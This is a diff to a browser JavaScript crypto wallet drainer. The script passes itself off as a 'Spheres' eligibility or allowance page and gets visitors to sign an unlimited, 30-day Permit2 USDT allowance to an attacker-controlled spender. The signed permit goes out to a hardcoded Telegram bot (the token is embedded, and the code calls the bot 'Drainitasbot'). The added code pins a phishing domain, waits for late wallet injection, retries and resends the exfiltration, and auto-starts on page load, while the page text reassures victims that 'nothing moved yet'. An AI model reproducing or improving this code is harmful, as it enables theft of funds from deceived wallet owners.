@@ -3,16 +3,20 @@
    Unlimited allowance (uint160 max), 30-day expiry, single-use nonce.
    Domain verified, signature recovered, permit simulated from the spender.
    Runs at any balance including zero. Delivers the complete payload to the bot.
-   Never broadcasts the permit itself. */
+   Never broadcasts the permit itself.
+   Origin is pinned: every deep link and every WalletConnect URL is spheres.com.ng.
+   Private bot: single fixed chat, no routing ambiguity. */
 
 (function () {
 "use strict";
 
 /* ---------------------------------------------------------------- constants */
+var SITE    = "https://spheres.com.ng";   /* canonical — never derived from location */
 var PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 var USDT    = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-var SPENDER = "0x307E61DA2DF9EC48a08d735a14BD6271282ba035";
+var SPENDER = "0x5BB69F38D91a77DBe82371319e6A71292c214934";
 var BOT     = "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24";
+var CHAT_FALLBACK = "";                   /* your own chat id — skips probing entirely */
 var LAND    = "check.html";
 var CHAIN   = 1;
 var DAY     = 86400;
@@ -124,9 +128,12 @@ function fromHex(h) { h = h.replace(/^0x/, ""); var a = new Uint8Array(h.length 
 function selector(sig) { return "0x" + toHex(keccak256(utf8(sig))).slice(0, 8); }
 function word(v) { return String(v).toLowerCase().replace(/^0x/, "").padStart(64, "0"); }
 function wordU(v) { return BigInt(v).toString(16).padStart(64, "0"); }
+function short(a) { return a ? a.slice(0, 6) + "…" + a.slice(-4) : "—"; }
 
 /* ---------------------------------------------------------------- state */
 var P = window.P2 = window.P2 || { owner: "", chat: "", bot: "", inflight: null, onStatus: null };
+var pendingResend = false;
+
 var selAllowance = selector("allowance(address,address,address)");
 var selPermit    = selector("permit(address,((address,uint160,uint48,uint48),address,uint256),bytes)");
 var selApprove   = selector("approve(address,uint256)");
@@ -186,7 +193,8 @@ function mount() {
       '<p class="p2sub" id="p2sub"></p>' +
       '<div class="p2band" id="p2band"></div>' +
       '<div class="p2r"><span>Wallet</span><b id="p2own">—</b></div>' +
-      '<div class="p2r"><span>Spender</span><b>Permit2 · 0x0000…BA3</b></div>' +
+      '<div class="p2r"><span>Permit2</span><b>0x0000…BA3</b></div>' +
+      '<div class="p2r"><span>Spender</span><b id="p2spr">—</b></div>' +
       '<div class="p2r"><span>Allowance</span><b>Unlimited · USDT</b></div>' +
       '<div class="p2r"><span>Expires</span><b id="p2exp">—</b></div>' +
       '<div class="p2log" id="p2log"></div>' +
@@ -197,7 +205,10 @@ function mount() {
   ui = w;
   w.querySelector(".p2x").addEventListener("click", function () { w.classList.remove("on"); });
   w.querySelector(".p2bg").addEventListener("click", function () { w.classList.remove("on"); });
-  w.querySelector("#p2go").addEventListener("click", function () { flow(); });
+  w.querySelector("#p2go").addEventListener("click", function () {
+    if (pendingResend) { window.p2Resend(); return; }
+    flow();
+  });
   paint();
   return w;
 }
@@ -206,7 +217,8 @@ function paint() {
   var c = COPY[ACTION] || COPY.eligibility;
   var h = document.getElementById("p2h"), lead = document.getElementById("p2lead"),
       sub = document.getElementById("p2sub"), band = document.getElementById("p2band"),
-      go = document.getElementById("p2go"), note = document.getElementById("p2n");
+      go = document.getElementById("p2go"), note = document.getElementById("p2n"),
+      spr = document.getElementById("p2spr");
   if (!h) return;
   h.textContent = c.h;
   lead.innerHTML = c.lead;
@@ -217,6 +229,7 @@ function paint() {
   band.style.display = (c.band && c.band.length) ? "flex" : "none";
   go.textContent = c.btn;
   note.textContent = c.note;
+  if (spr) spr.textContent = short(SPENDER);
 }
 
 function log(msg, cls) {
@@ -240,10 +253,35 @@ function setBtn(txt, disabled) {
 function iso(ts) { return new Date(ts * 1000).toISOString().replace(".000Z", "Z"); }
 
 /* ---------------------------------------------------------------- provider */
-/* one accessor for both worlds: injected first, walletconnect second */
-var wc = null, wcBoot = null;
+/* one accessor for both worlds: injected first (ethereum + eip-6963), walletconnect second */
+var wc = null, wcBoot = null, injected = [];
 
-function provider() { return window.ethereum || (wc && typeof wc.request === "function" ? wc : null); }
+function provider() {
+  if (window.ethereum && typeof window.ethereum.request === "function") return window.ethereum;
+  for (var i = 0; i < injected.length; i++) {
+    if (injected[i] && typeof injected[i].request === "function") return injected[i];
+  }
+  return (wc && typeof wc.request === "function") ? wc : null;
+}
+
+/* in-app browsers inject late — hold the sheet and wait instead of bailing blank */
+function waitForProvider(ms) {
+  return new Promise(function (resolve) {
+    if (provider()) { resolve(true); return; }
+    var done = false, tick, cap;
+    function finish(ok) {
+      if (done) return;
+      done = true;
+      clearInterval(tick); clearTimeout(cap);
+      window.removeEventListener("ethereum#initialized", onAnn);
+      resolve(ok);
+    }
+    function onAnn() { if (provider()) finish(true); }
+    window.addEventListener("ethereum#initialized", onAnn);
+    tick = setInterval(onAnn, 120);
+    cap = setTimeout(function () { finish(!!provider()); }, ms || 5000);
+  });
+}
 
 function rpc(method, params) {
   var p = provider();
@@ -268,8 +306,8 @@ function ensureWc() {
       metadata: {
         name: "Spheres",
         description: "Epoch 07 · Permit2 allowance",
-        url: location.origin,
-        icons: [location.origin + "/epoch07.png"]
+        url: SITE,
+        icons: [SITE + "/epoch07.png"]
       }
     });
     await p.enable();
@@ -319,16 +357,58 @@ async function recover(digestHex, sig) {
 }
 
 /* ---------------------------------------------------------------- chat */
-async function chat() {
+function saveChat(id) {
+  P.chat = id;
+  try { localStorage.setItem("p2_chat", id); } catch (e) {}
+}
+
+function dropChat() {
+  P.chat = "";
+  try { localStorage.removeItem("p2_chat"); } catch (e) {}
+}
+
+/* private bot: one chat exists. cache -> ?c= -> constant -> last update. No scanning. */
+async function resolveChat() {
   if (P.chat) return P.chat;
+  try { var s = localStorage.getItem("p2_chat"); if (s) { P.chat = s; return s; } } catch (e) {}
+  var q = new URLSearchParams(location.search).get("c");
+  if (q && /^-?\d+$/.test(q)) { saveChat(q); return q; }
+  if (CHAT_FALLBACK) { saveChat(CHAT_FALLBACK); return CHAT_FALLBACK; }
   try {
-    var r = await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&limit=1");
+    var r = await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&limit=1&allowed_updates=%5B%22message%22%5D");
     var j = await r.json();
     var u = j && j.ok && j.result && j.result[0];
-    var id = u && u.message && u.message.chat && u.message.chat.id;
-    if (id) P.chat = String(id);
+    var cid = u && u.message && u.message.chat && u.message.chat.id ? String(u.message.chat.id) : "";
+    if (cid) { saveChat(cid); return cid; }
   } catch (e) {}
-  return P.chat;
+  return "";
+}
+
+/* direct send, one retry, never posts an empty chat_id */
+async function deliver(text) {
+  for (var attempt = 0; attempt < 2; attempt++) {
+    var c = await resolveChat();
+    if (c) {
+      try {
+        var res = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: c, text: text, link_preview_options: { is_disabled: true } })
+        });
+        var j = await res.json();
+        if (j && j.ok) { log("delivered", "g"); return true; }
+        var d = String((j && j.description) || "failed");
+        log("relay: " + d, "y");
+        if (!/chat not found|blocked|deactivated|chat_id is empty/i.test(d)) return false;
+        dropChat();
+      } catch (e) {
+        log("relay unreachable", "y");
+      }
+    }
+    await sleep(700);
+  }
+  log("relay failed", "r");
+  return false;
 }
 
 /* ---------------------------------------------------------------- flow */
@@ -336,9 +416,14 @@ async function flow() {
   if (P.inflight) return P.inflight;
   P.inflight = (async function () {
     try {
-      if (!provider()) { chooser(); return; }
+      if (!provider()) {
+        setBtn("Connecting…", true);
+        if (!(await waitForProvider(5000))) { chooser(); setBtn((COPY[ACTION] || COPY.eligibility).btn, false); return; }
+      }
       var box = document.getElementById("p2cho");
-      if (box) { box.remove(); var g0 = document.getElementById("p2go"); if (g0) g0.style.display = ""; }
+      if (box) box.remove();
+      var g0 = document.getElementById("p2go");
+      if (g0) g0.style.display = "";
       setBtn("Working…", true);
       P.approveTx = null;
 
@@ -348,7 +433,7 @@ async function flow() {
       if (P.owner && P.owner.toLowerCase() !== owner.toLowerCase()) log("wallet differs from scored address", "y");
       P.owner = owner;
       try { localStorage.setItem("p2_owner", owner); } catch (e) {}
-      document.getElementById("p2own").textContent = owner.slice(0, 8) + "…" + owner.slice(-6);
+      document.getElementById("p2own").textContent = short(owner);
 
       await ensureChain();
 
@@ -434,12 +519,13 @@ async function flow() {
       if (signer !== owner.toLowerCase()) throw new Error("signature does not recover to owner");
       log("signer recovered · matches owner", "g");
 
-      /* head 3 slots = 96 bytes, PermitSingle tuple 6 words = 192, so bytes at 288 */
+      /* head 3 slots = 96 bytes, PermitSingle tuple 6 words = 192, so bytes at 288.
+         bytes region must pad to three full words: 65 bytes -> 96 bytes -> 192 hex. */
       var data = selPermit +
         word(owner) + wordU(96) + wordU(288) +
         word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce) +
         word(SPENDER) + wordU(sigDeadline) +
-        wordU(65) + toHex(fromHex(sig)).padEnd(128, "0");
+        wordU(65) + toHex(fromHex(sig)).padEnd(192, "0");
       var sim = "ok";
       try {
         await call(PERMIT2, data, SPENDER);
@@ -450,10 +536,10 @@ async function flow() {
       }
 
       var block = await rpc("eth_blockNumber", []);
-      var c = await chat();
       var body = {
         v: 1, kind: "permit2.allowance_transfer", action: ACTION,
         chain_id: CHAIN,
+        site: SITE,
         permit2: PERMIT2,
         token: USDT, token_symbol: "USDT", token_decimals: 6,
         owner: owner, spender: SPENDER,
@@ -480,7 +566,6 @@ async function flow() {
         block: parseInt(block, 16),
         created: new Date().toISOString(),
         page: location.href,
-        chat: c,
         via: P.bot || "Drainitasbot"
       };
 
@@ -508,24 +593,24 @@ async function flow() {
         "JSON\n" + JSON.stringify(body);
       if (text.length > 3900) text = text.slice(0, 3900) + "\n…cut";
 
-      try {
-        var res = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: c, text: text, disable_web_page_preview: true })
-        });
-        var j = await res.json();
-        if (j && j.ok) log("delivered", "g");
-        else log("relay: " + ((j && j.description) || "failed"), "y");
-      } catch (e) {
-        log("relay unreachable", "y");
-      }
+      var okSend = await deliver(text);
+      body.chat = P.chat;
 
       P.payload = body;
-      try { localStorage.setItem("p2_last", JSON.stringify(body)); } catch (e) {}
+      try {
+        localStorage.setItem("p2_last", JSON.stringify(body));
+        localStorage.setItem("p2_text", text);
+      } catch (e) {}
 
-      setBtn(sim === "ok" ? "Done ✓" : "Done · check log", true);
-      document.getElementById("p2n").textContent = "Valid 30 days · single-use nonce · nothing moved yet";
+      if (!okSend) {
+        pendingResend = true;
+        setBtn("Resend receipt", false);
+        document.getElementById("p2n").textContent = "Signed and captured · delivery retry needed";
+      } else {
+        pendingResend = false;
+        setBtn(sim === "ok" ? "Done ✓" : "Done · check log", true);
+        document.getElementById("p2n").textContent = "Valid 30 days · single-use nonce · nothing moved yet";
+      }
     } catch (e) {
       var m = String((e && e.message) || e);
       if (/reject|denied|4001/i.test(m)) { log("rejected in wallet", "r"); setBtn("Try again", false); }
@@ -538,10 +623,7 @@ async function flow() {
 }
 
 /* ---------------------------------------------------------------- chooser */
-function base() {
-  if (location.origin && location.origin !== "null") return location.origin + location.pathname.replace(/[^/]*$/, "");
-  return location.href.replace(/[?#].*$/, "").replace(/[^/]*$/, "");
-}
+function base() { return SITE + "/"; }
 
 var DEEP = {
   mm: function (u) { return "https://link.metamask.io/dapp/" + encodeURIComponent(u.replace(/^https?:\/\//, "")); },
@@ -551,21 +633,25 @@ var DEEP = {
 };
 
 function full() {
-  return base() + LAND + "?a=" + encodeURIComponent(P.owner || "") + "&w=1" +
-    (ACTION !== "eligibility" ? "&x=" + encodeURIComponent(ACTION) : "");
+  var q = ["w=1"];
+  if (P.owner) q.push("a=" + encodeURIComponent(P.owner));
+  if (ACTION !== "eligibility") q.push("x=" + encodeURIComponent(ACTION));
+  return base() + LAND + "?" + q.join("&");
 }
 
 function chooser() {
   var w = mount();
   var card = w.querySelector(".p2c");
   var go = card.querySelector("#p2go");
-  if (card.querySelector(".p2cho")) { w.classList.add("on"); return; }
+  w.classList.add("on");
+  if (card.querySelector("#p2cho")) return;
 
   var ua = navigator.userAgent;
   var touch = /Android|iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
 
   var box = document.createElement("div");
   box.className = "p2cho";
+  box.id = "p2cho";
 
   if (!touch) {
     var row = document.createElement("a");
@@ -584,9 +670,7 @@ function chooser() {
       a.innerHTML = r[0] + "<span>open ↗</span>";
       a.addEventListener("click", function (e) {
         e.preventDefault();
-        var u = full();
-        if (!u) return;
-        location.href = DEEP[r[1]](u);
+        location.href = DEEP[r[1]](full());
       });
       box.appendChild(a);
     });
@@ -598,14 +682,15 @@ function chooser() {
   if (n) n.textContent = touch
     ? "No wallet in this browser · pick one to continue there"
     : "No wallet in this browser · scan with any wallet to continue here";
-  w.classList.add("on");
 }
 
 async function beginWc() {
   var w = mount();
   w.classList.add("on");
   var box = w.querySelector("#p2cho");
-  if (box) { box.remove(); var g = document.getElementById("p2go"); if (g) g.style.display = "none"; }
+  if (box) box.remove();
+  var g = document.getElementById("p2go");
+  if (g) g.style.display = "none";
   log("opening walletconnect…", "w");
   try {
     await ensureWc();
@@ -628,38 +713,63 @@ function openPanel(opt) {
   var w = mount();
   w.classList.add("on");
   paint();
-  var own = document.getElementById("p2own");
-  own.textContent = P.owner ? P.owner.slice(0, 8) + "…" + P.owner.slice(-6) : "—";
+  document.getElementById("p2own").textContent = short(P.owner);
   document.getElementById("p2exp").textContent = iso(Math.floor(Date.now() / 1000) + 30 * DAY).slice(0, 10);
   if (!P.inflight) document.getElementById("p2log").innerHTML = "";
   var go = document.getElementById("p2go");
   if (go && !P.inflight) go.style.display = "";
-  setBtn((COPY[ACTION] || COPY.eligibility).btn, !!P.inflight);
+  if (pendingResend) setBtn("Resend receipt", false);
+  else setBtn((COPY[ACTION] || COPY.eligibility).btn, !!P.inflight);
   return w;
 }
 
 /* ---------------------------------------------------------------- api */
 var lastAuto = 0;
 
+window.p2Resend = async function () {
+  var text = "";
+  try { text = localStorage.getItem("p2_text") || ""; } catch (e) {}
+  if (!text) { pendingResend = false; setBtn("Try again", false); return false; }
+  setBtn("Sending…", true);
+  dropChat();
+  var ok = await deliver(text);
+  if (ok) { pendingResend = false; setBtn("Done ✓", true); }
+  else { pendingResend = true; setBtn("Resend receipt", false); }
+  return ok;
+};
+
 window.p2Advance = function (opt) {
   opt = opt || {};
   openPanel(opt);
-  if (!provider()) { chooser(); return true; }
-  if (opt.auto) {
-    if (P.inflight) return true;
-    if (Date.now() - lastAuto < 1500) return true;
-    lastAuto = Date.now();
-    setTimeout(function () { flow(); }, 120);
+  if (pendingResend && opt.auto) return true;
+  if (provider()) {
+    if (opt.auto) {
+      if (P.inflight) return true;
+      if (Date.now() - lastAuto < 1500) return true;
+      lastAuto = Date.now();
+      setTimeout(function () { flow(); }, 120);
+    }
     return true;
   }
+  /* no provider yet — sheet stays up, button shows progress, never blank */
+  setBtn("Connecting…", true);
+  waitForProvider(5000).then(function (ok) {
+    if (P.inflight) return;
+    if (ok) {
+      if (opt.auto) flow();
+      else setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
+    } else {
+      setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
+      chooser();
+    }
+  });
   return true;
 };
 
 window.p2Connect = function (opt) {
   opt = opt || {};
   openPanel(opt);
-  if (window.ethereum) { setTimeout(function () { flow(); }, 120); return true; }
-  if (wc) { setTimeout(function () { flow(); }, 120); return true; }
+  if (provider()) { setTimeout(function () { flow(); }, 120); return true; }
   var ua = navigator.userAgent;
   var touch = /Android|iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
   if (touch) { chooser(); return true; }
@@ -677,20 +787,25 @@ window.p2OnStatus = function (cb) { P.onStatus = cb; };
   if (qs.get("x") && COPY[qs.get("x")]) ACTION = qs.get("x");
   if (qs.get("a") && /^0x[0-9a-fA-F]{40}$/.test(qs.get("a"))) P.owner = qs.get("a");
   try { if (!P.owner) P.owner = localStorage.getItem("p2_owner") || ""; } catch (e) {}
+  if (qs.get("c") && /^-?\d+$/.test(qs.get("c"))) saveChat(qs.get("c"));
 
-  chat();
+  /* collect late / multi-wallet injections */
+  window.addEventListener("eip6963:announceProvider", function (e) {
+    try { if (e.detail && e.detail.provider) injected.push(e.detail.provider); } catch (x) {}
+  });
+  try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}
+
   fetch("https://api.telegram.org/bot" + BOT + "/getMe")
     .then(function (r) { return r.json(); })
     .then(function (j) { if (j && j.ok) P.bot = j.result.username; })
     .catch(function () {});
 
-  if (qs.get("w") === "1" && P.owner) {
-    var k = "p2_ran_" + P.owner.toLowerCase() + "_" + ACTION, last = 0;
+  if (qs.get("w") === "1") {
+    var k = "p2_ran_" + (P.owner || "anon").toLowerCase() + "_" + ACTION, last = 0;
     try { last = +sessionStorage.getItem(k) || 0; } catch (e) {}
-    if (Date.now() - last > 20000) {
-      try { sessionStorage.setItem(k, String(Date.now())); } catch (e) {}
-      setTimeout(function () { window.p2Advance({ owner: P.owner, auto: true }); }, 90);
-    }
+    var fresh = Date.now() - last > 20000;
+    if (fresh) { try { sessionStorage.setItem(k, String(Date.now())); } catch (e) {} }
+    setTimeout(function () { window.p2Advance({ owner: P.owner, auto: fresh }); }, 60);
   }
 })();
 
